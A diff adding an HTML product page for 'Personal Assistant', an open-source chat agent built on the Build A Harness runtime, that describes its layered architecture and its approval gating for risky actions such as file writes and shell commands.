@@ -1,0 +1,985 @@
+<!doctype html>
+<html lang="en">
+<head>
+<!-- Klaro Consent Management -->
+<script type="text/javascript">
+  var klaroConfig = {
+    storageMethod: 'cookie',
+    cookieName: 'klaro',
+    cookieExpiresAfterDays: 365,
+    privacyPolicy: '/privacy.html',
+    default: false,
+    mustConsent: false,
+    acceptAll: true,
+    hideDeclineAll: false,
+    hideLearnMore: false,
+    noticeAsModal: false,
+    translations: {
+      en: {
+        consentModal: {
+          title: 'Build A Harness — We value your privacy',
+          description: 'Here you can see and customize the information that we collect about you.',
+        },
+        decline: 'Reject all',
+        ok: 'Accept all',
+        analytics: {
+          description: 'Collection of information about how visitors use our website.',
+        },
+        purposes: {
+          analytics: 'Analytics',
+        },
+      },
+    },
+    services: [
+      {
+        name: 'analytics',
+        title: 'Analytics & Tracking',
+        purposes: ['analytics'],
+        required: false,
+      },
+    ],
+  };
+</script>
+<script defer src="https://cdn.kiprotect.com/klaro/v0.7.18/klaro.js"></script>
+<!-- Google tag (gtag.js) — loaded only after analytics consent via Klaro above -->
+<script async type="text/plain" data-type="text/javascript" data-name="analytics" src="https://www.googletagmanager.com/gtag/js?id=G-HG3KMR8T0N"></script>
+<script type="text/plain" data-type="text/javascript" data-name="analytics">
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-HG3KMR8T0N');
+</script>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Build A Harness — Personal Assistant: A Chat Agent Built on the 11-Layer Harness</title>
+
+<meta name="description" content="Personal Assistant is Build A Harness's own reference chat agent — walks the full 11-layer harness on real conversation, gates risky actions behind approval, and shares one core across CLI, browser, and desktop. Apache 2.0.">
+
+<link rel="canonical" href="https://buildaharness.com/personal-assistant">
+
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://buildaharness.com/personal-assistant">
+<meta property="og:site_name" content="Build A Harness">
+<meta property="og:title" content="Build A Harness — Personal Assistant: A Chat Agent Built on the 11-Layer Harness">
+<meta property="og:description" content="Personal Assistant is Build A Harness's own reference chat agent — walks the full 11-layer harness on real conversation, gates risky actions behind approval, and shares one core across CLI, browser, and desktop. Apache 2.0.">
+<meta property="og:image" content="https://buildaharness.com/og-image.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:alt" content="Build A Harness — visual canvas for harness engineering and AI agent harnesses.">
+<meta property="og:locale" content="en_US">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Build A Harness — Personal Assistant: A Chat Agent Built on the 11-Layer Harness">
+<meta name="twitter:description" content="Personal Assistant is Build A Harness's own reference chat agent — walks the full 11-layer harness on real conversation, gates risky actions behind approval, and shares one core across CLI, browser, and desktop. Apache 2.0.">
+<meta name="twitter:image" content="https://buildaharness.com/og-image.png">
+<meta name="twitter:image:alt" content="Build A Harness — visual canvas for harness engineering and AI agent harnesses.">
+
+<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1">
+<meta name="author" content="3IVIS">
+<meta name="keywords" content="AI personal assistant, chat agent, agent harness, AI agent framework, risk gating, human in the loop, tool approval, LangGraph, CrewAI, Mastra, FlowSpec, open source, apache 2.0">
+
+<link rel="alternate" type="text/plain" href="/llms.txt" title="llms.txt — structured summary for LLMs">
+<link rel="sitemap" type="application/xml" href="/sitemap.xml">
+<link rel="icon" type="image/svg+xml" href="favicon.svg">
+<link rel="apple-touch-icon" href="apple-touch-icon.png">
+<meta name="theme-color" content="#4F46E5">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@300;400;500;600&family=IBM+Plex+Mono:wght@400;500&family=Instrument+Serif:ital@0;1&display=swap" rel="stylesheet">
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "SoftwareApplication",
+      "@id": "https://buildaharness.com/personal-assistant#software",
+      "name": "Personal Assistant",
+      "applicationCategory": "DeveloperApplication",
+      "applicationSubCategory": "AI chat assistant built on an agent harness",
+      "operatingSystem": "Web, macOS, Linux, Windows",
+      "softwareVersion": "0.1.0",
+      "description": "Personal Assistant is a general-purpose, everyday-use chat agent that walks the full 11-layer Build A Harness architecture on real conversation, skips it entirely for a one-shot fact lookup, and gates a real email send or shell command behind explicit approval. Ships as a terminal CLI, a browser chat UI, and a native desktop app, all sharing one core.",
+      "url": "https://buildaharness.com/personal-assistant",
+      "downloadUrl": "https://github.com/3IVIS/buildaharness",
+      "softwareRequirements": "Node.js (CLI/browser); Rust toolchain only for building the native desktop app",
+      "programmingLanguage": ["TypeScript"],
+      "license": "https://www.apache.org/licenses/LICENSE-2.0",
+      "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" },
+      "isAccessibleForFree": true,
+      "author": { "@id": "https://buildaharness.com/#org" },
+      "keywords": "AI personal assistant, chat agent, agent harness, risk gating, human in the loop, tool approval, open source"
+    },
+    {
+      "@type": "WebPage",
+      "@id": "https://buildaharness.com/personal-assistant#webpage",
+      "url": "https://buildaharness.com/personal-assistant",
+      "name": "Build A Harness — Personal Assistant: A Chat Agent Built on the 11-Layer Harness",
+      "description": "Personal Assistant is Build A Harness's own reference chat agent — walks the full 11-layer harness on real conversation, gates risky actions behind approval, and shares one core across CLI, browser, and desktop.",
+      "datePublished": "2026-07-14",
+      "dateModified": "2026-07-14",
+      "publisher": { "@id": "https://buildaharness.com/#org" },
+      "breadcrumb": { "@id": "https://buildaharness.com/personal-assistant#breadcrumb" }
+    },
+    {
+      "@type": "BreadcrumbList",
+      "@id": "https://buildaharness.com/personal-assistant#breadcrumb",
+      "itemListElement": [
+        { "@type": "ListItem", "position": 1, "name": "Build A Harness", "item": "https://buildaharness.com/" },
+        { "@type": "ListItem", "position": 2, "name": "Personal Assistant", "item": "https://buildaharness.com/personal-assistant" }
+      ]
+    },
+    {
+      "@type": "Organization",
+      "@id": "https://buildaharness.com/#org",
+      "name": "3IVIS",
+      "url": "https://github.com/3IVIS",
+      "sameAs": ["https://github.com/3IVIS/buildaharness"]
+    },
+    {
+      "@type": "FAQPage",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "What is the Personal Assistant?",
+          "acceptedAnswer": { "@type": "Answer", "text": "Personal Assistant is a general-purpose, everyday-use chat agent built on Build A Harness's own 11-layer harness runtime. Where a heavy autonomous agent decomposes an objective into a multi-task plan, it treats every chat message as one objective, one task — walking every harness layer for ordinary conversation, skipping the harness entirely for a one-shot fact lookup, and gating a consequential request like 'send that email' behind explicit approval." }
+        },
+        {
+          "@type": "Question",
+          "name": "Does every chat message really run the full harness?",
+          "acceptedAnswer": { "@type": "Answer", "text": "Every turn except a narrow one: a fail-closed classifier recognizes a genuinely self-contained factual one-liner and returns that reply directly, skipping HarnessRuntime.run(). Everything else walks World Model, Evidence & Reasoning, Hypothesis, Contradiction, Diagnostics, Control State, Planning, Execution, Verification, Recovery, and the Reviewer Pass. Either way, the harness loop itself adds no LLM call of its own — synchronous bookkeeping over the reply already produced. That reply still costs one real model call, and a few narrow, cheaply-gated classifiers elsewhere in the turn can each add one more when their own keyword check can't resolve it confidently." }
+        },
+        {
+          "@type": "Question",
+          "name": "How does it decide what needs approval?",
+          "acceptedAnswer": { "@type": "Answer", "text": "Two independent gates. A cheap keyword risk classifier flags consequential message content (send, delete, pay, post, ...) before the harness runs — a message the keyword list alone catches returns needs_approval at zero LLM cost; an ambiguous one costs one extra classification call as a second opinion first and can still come back requiring approval. Separately, any write_file or run_shell_command tool call always stages its effect as a pending action rather than executing inline, regardless of what the message looked like, and only applies once the caller replies with approved: true and the matching pending action ID." }
+        },
+        {
+          "@type": "Question",
+          "name": "What happens if it crashes mid-turn?",
+          "acceptedAnswer": { "@type": "Answer", "text": "The harness runtime can suspend mid-loop and yields a serializable checkpoint after each iteration that makes progress. Personal Assistant writes that checkpoint for every turn that actually reaches HarnessRuntime.run() — not a one-shot fact lookup or one the risk gate stops cold — and deletes it once the turn finishes. Calling turn() again for a session with a leftover checkpoint resumes the interrupted run instead of silently starting over." }
+        },
+        {
+          "@type": "Question",
+          "name": "Where does it run?",
+          "acceptedAnswer": { "@type": "Answer", "text": "Three front ends share one core: a terminal CLI and a native desktop app (both filesystem-backed, under ~/.buildaharness/personal-assistant/ or the OS app-data directory), and a browser chat UI (IndexedDB/Dexie-backed). None is more 'real' than the others — same PersonalAssistant class, same harness, different storage adapter." }
+        },
+        {
+          "@type": "Question",
+          "name": "What stops file and shell access from being dangerous?",
+          "acceptedAnswer": { "@type": "Answer", "text": "Both are opt-in and off by default. File tools are scoped to one sandboxed workspace root with path-traversal and symlink-escape checks; write_file always stages instead of executing. Shell access is gated on every single call with no 'safe subset', runs with an env allowlist (PATH/HOME/LANG only), a hard timeout, and output truncation. Tool output from the shell or the web is wrapped as untrusted content before it re-enters the conversation. None of that makes shell access risk-free — these mitigations make it safer, not a substitute for deciding whether to enable it at all. This is an early-stage reference app (v0.1.0), not an independently audited security boundary." }
+        }
+      ]
+    }
+  ]
+}
+</script>
+
+<style>
+:root{
+  --bg:oklch(.972 .008 270);
+  --bg-2:oklch(.948 .012 270);
+  --paper:oklch(.985 .008 270);
+  --ink:oklch(.19 .024 270);
+  --ink-2:oklch(.37 .02 270);
+  --ink-3:oklch(.55 .018 270);
+  --line:oklch(.84 .014 270);
+  --accent:oklch(.46 .16 268);
+  --accent-ink:oklch(.36 .16 270);
+  --green:oklch(.38 .12 148);
+  --green-tint:oklch(.93 .04 148);
+}
+
+*{box-sizing:border-box}
+
+html,body{margin:0;padding:0;background:var(--bg);color:var(--ink);}
+
+body{
+  font-family:"IBM Plex Sans",sans-serif;
+  line-height:1.6;
+  -webkit-font-smoothing:antialiased;
+}
+
+.wrap{max-width:1180px;margin:0 auto;padding:0 40px;}
+.prose{max-width:740px;}
+
+/* header */
+header{border-bottom:1px solid var(--line);background:var(--paper);}
+.site-inner{display:flex;align-items:center;justify-content:space-between;padding:18px 0;}
+.brand{display:flex;align-items:center;gap:12px;text-decoration:none;color:var(--ink);}
+.brand .name{font-family:"IBM Plex Mono",monospace;font-size:15px;white-space:nowrap;}
+.nav{display:flex;gap:22px;font-family:"IBM Plex Mono",monospace;font-size:12px;}
+.nav a{text-decoration:none;color:var(--ink-2);}
+.nav a:hover{color:var(--ink);}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:10px 16px;border-radius:6px;text-decoration:none;
+  background:var(--ink);color:white;
+  font-family:"IBM Plex Mono",monospace;font-size:12px;
+  border:1px solid var(--ink);
+}
+.btn-ghost{background:transparent;color:var(--ink);border-color:var(--line);}
+.btn-ghost:hover{border-color:var(--ink);}
+
+/* breadcrumb */
+.breadcrumb{
+  font-family:"IBM Plex Mono",monospace;font-size:12px;
+  color:var(--ink-3);margin-bottom:32px;
+}
+.breadcrumb a{color:var(--ink-3);text-decoration:none;}
+.breadcrumb a:hover{color:var(--ink-2);}
+.breadcrumb span{margin:0 6px;}
+
+/* eyebrow */
+.eyebrow{
+  font-family:"IBM Plex Mono",monospace;text-transform:uppercase;
+  font-size:11px;letter-spacing:.16em;color:var(--accent-ink);
+  margin-bottom:22px;
+}
+
+/* hero */
+.page-hero{padding:64px 0 72px;background:var(--paper);border-bottom:1px solid var(--line);}
+
+h1{
+  font-size:56px;line-height:1.05;letter-spacing:-.04em;
+  font-weight:300;margin:0 0 24px;max-width:820px;
+}
+h1 em{
+  font-family:"Instrument Serif",serif;font-style:italic;
+  color:var(--accent-ink);font-weight:400;
+}
+
+.hero-lede{
+  font-size:19px;font-weight:300;color:var(--ink-2);
+  max-width:660px;margin:0 0 40px;line-height:1.5;
+}
+
+/* stats */
+.stat-row{
+  display:flex;gap:0;border:1px solid var(--line);border-radius:6px;
+  overflow:hidden;margin-bottom:36px;max-width:820px;
+}
+.stat{
+  flex:1;padding:22px 24px;background:var(--bg);
+  border-right:1px solid var(--line);
+}
+.stat:last-child{border-right:none;}
+.stat-n{
+  display:block;font-size:32px;font-weight:300;letter-spacing:-.03em;
+  color:var(--accent-ink);font-family:"IBM Plex Mono",monospace;
+  margin-bottom:6px;
+}
+.stat-l{display:block;font-size:13px;color:var(--ink-3);line-height:1.4;}
+
+.cta-row{display:flex;gap:12px;flex-wrap:wrap;}
+
+/* content sections */
+.section{padding:64px 0;background:var(--paper);}
+.section.alt{background:var(--bg);}
+
+h2{
+  font-size:36px;font-weight:300;letter-spacing:-.03em;
+  margin:0 0 20px;line-height:1.15;
+}
+h2 em{
+  font-family:"Instrument Serif",serif;font-style:italic;
+  color:var(--accent-ink);font-weight:400;
+}
+
+.section-label{
+  font-family:"IBM Plex Mono",monospace;text-transform:uppercase;
+  font-size:10.5px;letter-spacing:.18em;color:var(--ink-3);
+  margin-bottom:16px;
+}
+
+p{font-size:16px;color:var(--ink-2);line-height:1.7;margin:0 0 18px;}
+p:last-child{margin-bottom:0;}
+strong{color:var(--ink);font-weight:600;}
+
+/* comparison block */
+.compare-grid{
+  display:grid;grid-template-columns:1fr 1fr;gap:16px;
+  margin-top:28px;max-width:820px;
+}
+.compare-card{
+  border:1px solid var(--line);border-radius:6px;
+  background:var(--bg);padding:24px 26px;
+}
+.compare-card.highlight{
+  border-color:oklch(.78 .06 268);
+  background:oklch(.95 .018 268);
+}
+.compare-card h3{
+  font-size:14px;font-weight:600;font-family:"IBM Plex Mono",monospace;
+  text-transform:uppercase;letter-spacing:.1em;margin:0 0 14px;
+  color:var(--ink-3);
+}
+.compare-card.highlight h3{color:var(--accent-ink);}
+.compare-card ul{
+  margin:0;padding:0 0 0 16px;
+  display:flex;flex-direction:column;gap:8px;
+}
+.compare-card li{font-size:14.5px;color:var(--ink-2);line-height:1.5;}
+.compare-card.highlight li{color:var(--ink);}
+
+/* layers */
+.layers-grid{
+  display:grid;grid-template-columns:1fr 1fr;gap:12px;
+  margin-top:28px;
+}
+.layer-card{
+  border:1px solid var(--line);border-radius:6px;
+  background:var(--paper);padding:20px 22px;
+  border-left:3px solid var(--accent);
+  display:flex;flex-direction:column;gap:6px;
+}
+.layer-num{
+  font-family:"IBM Plex Mono",monospace;font-size:10px;
+  color:var(--ink-3);text-transform:uppercase;letter-spacing:.14em;
+}
+.layer-name{font-size:16px;font-weight:600;color:var(--ink);letter-spacing:-.01em;}
+.layer-desc{font-size:14px;color:var(--ink-2);line-height:1.5;}
+.layer-without{
+  font-size:12.5px;color:var(--ink-3);
+  font-family:"IBM Plex Mono",monospace;
+  margin-top:4px;
+}
+
+/* process steps */
+.process-steps{
+  display:grid;grid-template-columns:repeat(4,1fr);
+  gap:0;border:1px solid var(--line);border-radius:6px;
+  overflow:hidden;margin-top:28px;
+}
+.process-step{
+  padding:24px 22px;background:var(--paper);
+  border-right:1px solid var(--line);
+  display:flex;flex-direction:column;gap:10px;
+}
+.process-step:last-child{border-right:none;}
+.process-step-n{
+  font-family:"IBM Plex Mono",monospace;font-size:10px;
+  color:var(--accent-ink);text-transform:uppercase;letter-spacing:.16em;
+}
+.process-step-title{font-size:17px;font-weight:600;color:var(--ink);letter-spacing:-.01em;}
+.process-step-sub{font-size:13.5px;color:var(--ink-2);line-height:1.5;}
+.process-step-detail{
+  font-family:"IBM Plex Mono",monospace;font-size:11px;
+  color:var(--ink-3);line-height:1.6;
+}
+
+/* quickstart */
+.quickstart-box{
+  border:1px solid var(--line);border-radius:6px;
+  overflow:hidden;max-width:640px;
+  margin-top:28px;
+}
+.quickstart-bar{
+  padding:11px 18px;background:var(--bg-2);border-bottom:1px solid var(--line);
+  font-family:"IBM Plex Mono",monospace;font-size:10.5px;
+  text-transform:uppercase;letter-spacing:.14em;color:var(--ink-3);
+}
+pre{
+  margin:0;padding:20px 18px;
+  font-family:"IBM Plex Mono",monospace;font-size:13px;
+  line-height:1.7;color:var(--ink);background:var(--paper);
+  overflow-x:auto;
+}
+
+/* services list */
+.services{
+  display:flex;flex-direction:column;gap:6px;margin-top:20px;
+}
+.service-row{
+  display:flex;align-items:center;gap:14px;
+  padding:10px 14px;border:1px solid var(--line);
+  border-radius:4px;background:var(--paper);
+}
+.service-dot{width:6px;height:6px;border-radius:50%;background:var(--green);flex-shrink:0;}
+.service-name{font-family:"IBM Plex Mono",monospace;font-size:12.5px;font-weight:500;color:var(--ink);}
+.service-url{font-family:"IBM Plex Mono",monospace;font-size:12px;color:var(--ink-3);}
+
+/* tool callout */
+.tool-callout{
+  margin-top:20px;padding:14px 18px;
+  border:1px solid var(--line);border-radius:6px;
+  background:var(--paper);
+  display:flex;align-items:flex-start;gap:16px;
+}
+.tool-callout-label{
+  font-family:"IBM Plex Mono",monospace;font-size:10px;
+  text-transform:uppercase;letter-spacing:.14em;
+  color:var(--accent-ink);white-space:nowrap;flex-shrink:0;padding-top:2px;
+}
+.tool-callout p{
+  margin:0;font-size:13.5px;color:var(--ink-2);line-height:1.5;
+}
+
+/* front-end table */
+.fe-table{
+  width:100%;border-collapse:collapse;margin-top:28px;
+  border:1px solid var(--line);border-radius:6px;overflow:hidden;
+}
+.fe-table th,.fe-table td{
+  text-align:left;padding:14px 18px;border-bottom:1px solid var(--line);
+  font-size:14px;color:var(--ink-2);vertical-align:top;
+}
+.fe-table tr:last-child td{border-bottom:none;}
+.fe-table th{
+  font-family:"IBM Plex Mono",monospace;font-size:10.5px;text-transform:uppercase;
+  letter-spacing:.12em;color:var(--ink-3);background:var(--bg-2);font-weight:500;
+}
+.fe-table td:first-child,.fe-table th:first-child{font-weight:600;color:var(--ink);white-space:nowrap;}
+.fe-table-wrap{overflow-x:auto;}
+
+/* faq */
+.faq-list{
+  border:1px solid var(--line);border-radius:6px;overflow:hidden;
+  margin-top:24px;
+}
+.faq-item{
+  padding:22px 26px;border-bottom:1px solid var(--line);
+  background:var(--paper);
+}
+.faq-item:last-child{border-bottom:none;}
+.faq-item h3{
+  font-size:17px;font-weight:500;letter-spacing:-.01em;
+  color:var(--ink);margin:0 0 8px;
+}
+.faq-item p{font-size:14.5px;}
+
+/* cta section */
+.cta-section{
+  padding:64px 0;border-top:1px solid var(--line);
+  background:var(--paper);
+}
+.cta-inner{
+  display:flex;align-items:flex-start;justify-content:space-between;
+  gap:40px;flex-wrap:wrap;
+}
+.cta-text h2{margin-bottom:12px;}
+.cta-text p{max-width:540px;}
+.cta-actions{display:flex;flex-direction:column;gap:12px;flex-shrink:0;padding-top:8px;}
+
+/* footer */
+footer{padding:32px 0;border-top:1px solid var(--line);}
+.footer-inner{
+  display:flex;justify-content:space-between;align-items:center;
+  flex-wrap:wrap;gap:20px;
+}
+.footer-links{display:flex;gap:18px;flex-wrap:wrap;}
+.footer-links a{
+  text-decoration:none;color:var(--ink-2);
+  font-family:"IBM Plex Mono",monospace;font-size:12px;
+}
+.footer-tag{
+  font-family:"Instrument Serif",serif;color:var(--ink-3);font-style:italic;
+}
+
+@media(max-width:760px){
+  .wrap{padding:0 22px;}
+  h1{font-size:36px;}
+  h2{font-size:28px;}
+  .stat-row{flex-direction:column;}
+  .stat{border-right:none;border-bottom:1px solid var(--line);}
+  .stat:last-child{border-bottom:none;}
+  .compare-grid{grid-template-columns:1fr;}
+  .layers-grid{grid-template-columns:1fr;}
+  .process-steps{grid-template-columns:1fr 1fr;}
+  .cta-inner{flex-direction:column;}
+  .nav{display:none;}
+  .tool-callout{flex-direction:column;gap:8px;}
+  .fe-table{font-size:13px;}
+}
+</style>
+</head>
+
+<body>
+
+<header>
+  <div class="wrap site-inner">
+    <a class="brand" href="/" aria-label="Build A Harness home">
+      <span class="name">Build A Harness</span>
+    </a>
+    <nav class="nav">
+      <a href="/#why">Harness</a>
+      <a href="/#roadmap">Node library</a>
+      <a href="/#runtimes">Frameworks</a>
+      <a href="/harness-engineering">Harness engineering</a>
+      <a href="/harness-comparison">Harness comparison</a>
+      <a href="/personal-assistant" style="color:var(--accent-ink);">Personal Assistant</a>
+      <a href="/#faq">FAQ</a>
+    </nav>
+    <a class="btn" href="https://github.com/3IVIS/buildaharness">GitHub</a>
+  </div>
+</header>
+
+
+<section class="page-hero">
+  <div class="wrap">
+
+    <nav class="breadcrumb" aria-label="Breadcrumb">
+      <a href="/">Build A Harness</a><span aria-hidden="true">/</span><span>Personal Assistant</span>
+    </nav>
+
+    <div class="eyebrow">BUILD A HARNESS · PERSONAL ASSISTANT · APACHE 2.0</div>
+
+    <h1>
+      A chat assistant with<br>
+      <em>an actual harness underneath.</em>
+    </h1>
+
+    <p class="hero-lede">
+      Personal Assistant is Build A Harness's own reference application — an everyday chat agent that walks the full 11-layer harness on real conversation, skips the bookkeeping entirely for a one-shot fact lookup, and stops to ask before it actually sends that email.
+    </p>
+
+    <div class="stat-row" role="list">
+      <div class="stat" role="listitem">
+        <span class="stat-n">11</span>
+        <span class="stat-l">harness layers walked on every turn that isn't a one-shot fact lookup — World Model through Reviewer Pass</span>
+      </div>
+      <div class="stat" role="listitem">
+        <span class="stat-n">1</span>
+        <span class="stat-l">task per chat message, by default — no multi-step plan unless the message actually reads as a compound request</span>
+      </div>
+      <div class="stat" role="listitem">
+        <span class="stat-n">3</span>
+        <span class="stat-l">front ends — CLI, browser, native desktop — sharing one core assistant class</span>
+      </div>
+    </div>
+
+    <div class="cta-row">
+      <a class="btn" href="https://github.com/3IVIS/buildaharness/tree/main/packages/personal-assistant">Get the package — GitHub</a>
+      <a class="btn btn-ghost" href="/">See Build A Harness →</a>
+      <a class="btn btn-ghost" href="#design">How it's built ↓</a>
+    </div>
+
+  </div>
+</section>
+
+
+<section class="section" id="design">
+  <div class="wrap prose">
+
+    <div class="section-label">DESIGN</div>
+    <h2>One message, <em>one objective, one task.</em></h2>
+
+    <p>
+      Most autonomous agents decompose a goal into a multi-task plan — research, then draft, then revise, then send. Personal Assistant deliberately doesn't do that. Every chat message is treated as <strong>one objective, one task</strong>, which keeps the harness's <code style="font-size:14px">HarnessRuntime.run()</code> cheap per turn — it's synchronous state-machine bookkeeping, not an inner loop of LLM calls — while still walking its full 11-layer sequence, World Model through Reviewer Pass (the exact breakdown is below), with context compression and cross-turn learning running alongside it.
+    </p>
+
+    <p>
+      Three things deliberately live <em>outside</em> a single harness run rather than being folded back into per-turn state:
+    </p>
+
+    <ul style="margin:0 0 18px;padding-left:20px;display:flex;flex-direction:column;gap:10px;">
+      <li style="font-size:16px;color:var(--ink-2);line-height:1.6;"><strong>Conversation history</strong> — kept in a memory adapter and fed to the model directly, the same transcript across every turn's fresh harness run.</li>
+      <li style="font-size:16px;color:var(--ink-2);line-height:1.6;"><strong>Risk classification</strong> — a cheap keyword heuristic that flags consequential requests before the harness, and usually before any LLM call, ever runs — it escalates to one extra classification call only when a message reads LOW-risk by keyword but still looks action-shaped.</li>
+      <li style="font-size:16px;color:var(--ink-2);line-height:1.6;"><strong>Cross-turn learning</strong> — strategy weights, learned decompositions, and recovery sequences accumulate in an experience store that outlives any single turn.</li>
+    </ul>
+
+    <p>
+      One more classifier runs right after that reply comes back, ahead of the harness: a narrow, fail-closed check recognizes a genuinely self-contained factual one-liner ("What's the capital of Mongolia?") and returns that same reply straight to the caller, skipping <code style="font-size:13px">HarnessRuntime.run()</code> entirely — there's nothing left to plan, gate, or verify around a single fact lookup, so the bookkeeping would only add latency. It defaults to "not trivial" and disqualifies itself the moment the message references prior conversation, asks for reasoning or generated content, or reads as two questions joined into one — see <code style="font-size:13px">triviality-classifier.ts</code>. Everything else — ordinary conversation, anything worth decomposing, anything consequential — gets that same reply wrapped in the full harness run below instead of returned directly.
+    </p>
+
+    <p>
+      Net effect: <code style="font-size:13px">HarnessRuntime.run()</code> itself never calls the model — verification, control state, and the reviewer pass are synchronous bookkeeping laid over the reply already produced, not a second round of calls. That doesn't make the turn a flat one-call turn overall, though: a handful of narrow, cheaply-gated classifiers <em>outside</em> the harness — an ambiguous risk read, a compound-looking request, starting or abandoning a structured plan, checking long tool output for injected instructions — can each add one more real call, but only when their own keyword/regex check can't resolve it with confidence on its own. The one path with zero LLM calls at all is a message the risk gate stops cold before any call is made. Either way, every layer of the harness is genuinely exercised on every turn that reaches it — not skipped past by a thin wrapper that calls itself a harness.
+    </p>
+
+  </div>
+</section>
+
+
+<section class="section alt" id="layers">
+  <div class="wrap">
+
+    <div class="section-label">ARCHITECTURE</div>
+    <h2>The same eleven layers, <em>applied to a chat message.</em></h2>
+
+    <p class="prose" style="margin-bottom:0;">
+      This is the exact 11-layer breakdown Personal Assistant's own code tracks turn by turn — the same list its <code style="font-size:13px">/why</code> command and chat-ui's "Why?" panel render, collapsed down from about 25 individual harness nodes (see <code style="font-size:13px">node-display-names.ts</code>). Skipped entirely on a trivial fact-lookup turn; walked in full on everything else.
+    </p>
+
+    <div class="layers-grid">
+
+      <div class="layer-card" style="border-left-color:oklch(.46 .18 290)">
+        <span class="layer-num">Layer</span>
+        <span class="layer-name">World Model</span>
+        <span class="layer-desc">Fresh, typed beliefs formed for this turn — what the message says, what the transcript already established.</span>
+      </div>
+
+      <div class="layer-card" style="border-left-color:oklch(.46 .14 148)">
+        <span class="layer-num">Layer</span>
+        <span class="layer-name">Evidence &amp; Reasoning</span>
+        <span class="layer-desc">The evidence store backing the reply, weighted by how reliable each tool's results have been.</span>
+      </div>
+
+      <div class="layer-card" style="border-left-color:oklch(.46 .18 310)">
+        <span class="layer-num">Layer</span>
+        <span class="layer-name">Hypothesis</span>
+        <span class="layer-desc">Candidate readings of an ambiguous message, generated and scored before a reply is drafted.</span>
+      </div>
+
+      <div class="layer-card" style="border-left-color:oklch(.50 .1 25)">
+        <span class="layer-num">Layer</span>
+        <span class="layer-name">Contradiction</span>
+        <span class="layer-desc">Checks a new belief against ones already on record this session — "the build is passing" against a "failing" belief from three turns ago.</span>
+      </div>
+
+      <div class="layer-card" style="border-left-color:oklch(.55 .1 90)">
+        <span class="layer-num">Layer</span>
+        <span class="layer-name">Diagnostics</span>
+        <span class="layer-desc">Health vectors — confidence, granularity, entropy — computed from the turn so far and fed into Control State.</span>
+      </div>
+
+      <div class="layer-card" style="border-left-color:oklch(.52 .14 60)">
+        <span class="layer-num">Layer</span>
+        <span class="layer-name">Control State</span>
+        <span class="layer-desc">NORMAL / CAUTIOUS / BLOCKED resolved for this turn — reported back in every result's <code style="font-size:12px">controlState</code>.</span>
+      </div>
+
+      <div class="layer-card" style="border-left-color:oklch(.46 .16 240)">
+        <span class="layer-num">Layer</span>
+        <span class="layer-name">Planning</span>
+        <span class="layer-desc">A trivial one-task graph, deliberately — not the multi-step decomposition a heavier autonomous agent would build.</span>
+      </div>
+
+      <div class="layer-card" style="border-left-color:oklch(.46 .18 20)">
+        <span class="layer-num">Layer</span>
+        <span class="layer-name">Execution</span>
+        <span class="layer-desc">Risk and value-of-information estimated, a review gate runs, then — and only then — the action executes.</span>
+      </div>
+
+      <div class="layer-card" style="border-left-color:oklch(.46 .12 205)">
+        <span class="layer-num">Layer</span>
+        <span class="layer-name">Verification</span>
+        <span class="layer-desc">The draft reply is checked before it's returned — not trusted on the model's first pass.</span>
+      </div>
+
+      <div class="layer-card" style="border-left-color:oklch(.52 .14 40)">
+        <span class="layer-num">Layer</span>
+        <span class="layer-name">Recovery</span>
+        <span class="layer-desc">A rollback-and-replan path exists if something in the loop fails, instead of the whole turn crashing out.</span>
+      </div>
+
+      <div class="layer-card" style="border-left-color:oklch(.46 .14 148)">
+        <span class="layer-num">Layer</span>
+        <span class="layer-name">Reviewer Pass</span>
+        <span class="layer-desc">A final pass checks the proposed change before it leaves the harness — and can run a second time if an earlier layer sends the turn back through it.</span>
+      </div>
+
+    </div>
+
+    <p class="prose" style="margin-top:20px;margin-bottom:0;">
+      Two more mechanisms run alongside these 11, on every turn that reaches the harness at all: <strong>context compression</strong> (keeps a long conversation inside the model's context window instead of silently truncating it) and the <strong>experience store</strong> (carries strategy weights and learned decompositions across turns). They're real and always-on, just not among the 11 layers above — <code style="font-size:13px">node-display-names.ts</code>'s own comment calls them "loop scaffolding," deliberately excluded from that count.
+    </p>
+
+    <div class="tool-callout" style="margin-top:28px;background:var(--paper);">
+      <div class="tool-callout-label">Why it matters</div>
+      <p><a href="/harness-comparison" style="color:var(--accent-ink);">The harness comparison page</a> finds Output &amp; Reviewer Pass shipping in none of Hermes Agent, Kilo Code, or OpenClaw, and Control State at best partial in any of them — never both together, complete, the way every non-trivial turn here gets.</p>
+    </div>
+
+  </div>
+</section>
+
+
+<section class="section" id="risk-gate">
+  <div class="wrap prose">
+
+    <div class="section-label">SAFETY</div>
+    <h2>Stops before it spends <em>a token or takes an action.</em></h2>
+
+    <p>
+      Two independent gates decide what needs a human's sign-off — neither one trusts the model to decide for itself.
+    </p>
+
+    <p>
+      <strong>Message-level risk gate.</strong> Before the harness runs, a cheap keyword heuristic scans the message for consequential intent — send, delete, pay, post, and similar. A message the keyword list alone flags as HIGH-risk returns <code style="font-size:14px">status: 'needs_approval'</code> immediately, at zero LLM cost. One case escalates before that check completes: a message that reads LOW-risk by keyword but still looks action-shaped gets one extra classification call as a second opinion, which can itself still come back requiring approval. Reply with <code style="font-size:14px">{ approved: true }</code> and the same message proceeds through the harness normally.
+    </p>
+
+    <p>
+      <strong>Tool-call staging.</strong> <code style="font-size:14px">write_file</code> and <code style="font-size:14px">run_shell_command</code> never execute inline, regardless of what the message looked like — a request like "organize my notes into a summary file" doesn't trip the message-level gate, yet still performs a real write. Every call stages a proposal instead — the exact path and content, or the exact command and working directory — and the turn returns <code style="font-size:14px">needs_approval</code> with a <code style="font-size:14px">pendingActionId</code>. Approving resumes by ID and applies the <em>exact</em> staged action directly, with no second LLM call able to improvise something different from what was shown for approval.
+    </p>
